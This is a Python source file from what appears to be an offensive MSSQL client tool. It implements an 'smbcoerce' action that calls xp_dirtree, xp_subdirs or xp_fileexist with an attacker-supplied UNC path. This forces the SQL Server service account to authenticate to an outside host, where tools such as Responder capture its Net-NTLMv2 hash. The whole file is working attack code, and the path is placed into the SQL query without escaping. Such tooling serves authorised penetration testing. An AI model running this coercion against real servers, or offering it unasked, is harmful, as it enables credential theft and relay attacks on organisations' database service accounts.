# mssqlclient_ng/core/actions/remote/smb_coerce.py

# Built-in imports
import re
from typing import Optional

# Third-party imports
from loguru import logger

# Local library imports
from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext


@ActionFactory.register(
    "smbcoerce",
    "Force SMB authentication to a specified UNC path to capture time-limited Net-NTLMv2 challenge/response.",
)
class SmbCoerce(BaseAction):
    """
    Trigger SMB coercion using multiple fallback methods.

    This action attempts to authenticate to a UNC path via SQL Server extended stored
    procedures (xp_dirtree, xp_subdirs, xp_fileexist). This forces the SQL Server
    service account to initiate an SMB connection, which can be intercepted using
    tools like Responder.

    Supported methods (in order of preference):
    1. xp_dirtree - Lists directory contents (most reliable)
    2. xp_subdirs - Lists subdirectories (alternative)
    3. xp_fileexist - Checks if file exists (last resort)
    """

    def __init__(self):
        super().__init__()
        self._unc_path: Optional[str] = None

    def validate_arguments(self, additional_arguments: str) -> None:
        """
        Validate and normalize the UNC path argument.

        Args:
            additional_arguments: The UNC path (e.g., \\\\192.168.1.10\\share)

        Raises:
            ValueError: If the UNC path is invalid or missing
        """
        if not additional_arguments or not additional_arguments.strip():
            raise ValueError(
                "SMB action requires a targeted UNC path (e.g., \\\\172.16.118.218\\shared)."
            )

        path = additional_arguments.strip()

        # Auto-prepend \\ if missing
        if not path.startswith("\\\\"):
            path = "\\\\" + path.lstrip("\\")

        # If only hostname provided (no share), append default share name
        parts = path[2:].split("\\")
        parts = [p for p in parts if p]  # Remove empty strings
        if len(parts) == 1:
            # Only hostname, add default share
            path = path.rstrip("\\") + "\\Data"

        # Verify UNC path format
        if not self._validate_unc_path(path):
            raise ValueError(
                f"Invalid UNC path format: {path}. Ensure it includes a valid host and share name."
            )

        self._unc_path = path

    def execute(self, database_context: DatabaseContext) -> Optional[bool]:
        """
        Execute SMB coercion using multiple fallback methods.

        Args:
            database_context: The database context containing QueryService

        Returns:
            True if at least one method succeeded, False if all methods failed
        """
        logger.info(f"Sending SMB request to: {self._unc_path}")

        # Method 1: Try xp_dirtree (most common)
        if self._try_xp_dirtree(database_context):
            return True

        # Method 2: Try xp_subdirs (fallback)
        if self._try_xp_subdirs(database_context):
            return True

        # Method 3: Try xp_fileexist (last resort)
        if self._try_xp_fileexist(database_context):
            return True

        logger.error("All SMB coercion methods failed.")
        return False

    def _try_xp_dirtree(self, database_context: DatabaseContext) -> bool:
        """
        Attempt SMB coercion using xp_dirtree (most reliable method).

        Args:
            database_context: The database context

        Returns:
            True if successful, False otherwise
        """
        try:
            logger.info("Trying xp_dirtree method...")

            query = f"EXEC master..xp_dirtree '{self._unc_path}';"
            database_context.query_service.execute(query)

            logger.success("SMB request sent successfully using xp_dirtree")
            return True
        except Exception as ex:
            logger.warning(f"xp_dirtree method failed: {ex}")
            return False

    def _try_xp_subdirs(self, database_context: DatabaseContext) -> bool:
        """
        Attempt SMB coercion using xp_subdirs (alternative method).

        Args:
            database_context: The database context

        Returns:
            True if successful, False otherwise
        """
        try:
            logger.info("Trying xp_subdirs method...")

            query = f"EXEC master..xp_subdirs '{self._unc_path}';"
            database_context.query_service.execute(query)

            logger.success("SMB request sent successfully using xp_subdirs")
            return True
        except Exception as ex:
            logger.warning(f"xp_subdirs method failed: {ex}")
            return False

    def _try_xp_fileexist(self, database_context: DatabaseContext) -> bool:
        """
        Attempt SMB coercion using xp_fileexist (last resort method).

        Args:
            database_context: The database context

        Returns:
            True if successful, False otherwise
        """
        try:
            logger.info("Trying xp_fileexist method...")

            # xp_fileexist requires a file path, append a file
            file_path = self._unc_path.rstrip("\\") + "\\data.txt"
            query = f"EXEC master..xp_fileexist '{file_path}';"
            database_context.query_service.execute(query)

            logger.success("SMB request sent successfully using xp_fileexist")
            logger.info(
                "Note: xp_fileexist was used with a dummy file path to trigger SMB authentication"
            )
            return True
        except Exception as ex:
            logger.warning(f"xp_fileexist method failed: {ex}")
            return False

    def _validate_unc_path(self, path: str) -> bool:
        """
        Validate the format of a UNC path.

        Args:
            path: The UNC path to validate

        Returns:
            True if the path is valid, False otherwise
        """
        # UNC path validation: \\hostname\share
        unc_pattern = r"^\\\\[a-zA-Z0-9\-\.]+\\[a-zA-Z0-9\-_\.]+"
        return bool(re.match(unc_pattern, path))

    def get_arguments(self) -> list:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return ["UNC path for SMB coercion (e.g., \\\\192.168.1.10\\share)"]
